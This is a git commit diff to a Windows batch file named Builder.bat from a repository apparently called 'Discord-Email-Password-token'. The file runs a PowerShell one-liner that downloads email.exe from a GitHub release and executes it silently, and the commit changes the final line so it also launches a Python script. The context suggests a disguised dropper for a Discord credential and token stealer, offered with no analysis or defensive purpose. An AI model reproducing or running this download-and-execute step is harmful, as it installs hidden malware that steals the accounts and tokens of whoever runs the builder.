e608d9ef9a93276f7382eb22dcb9bc56244cc7b1
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-04-06 15:13:58 +0200

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -7,8 +7,7 @@ color 0c
 echo.
 echo Coded By https://github.com/IWcommunityFR
 echo.
-
 cd dist
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Discord-Email-Password-token/releases/download/Email-Password-token/email.exe';$file='email.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
-start 
+start output\data\main.py
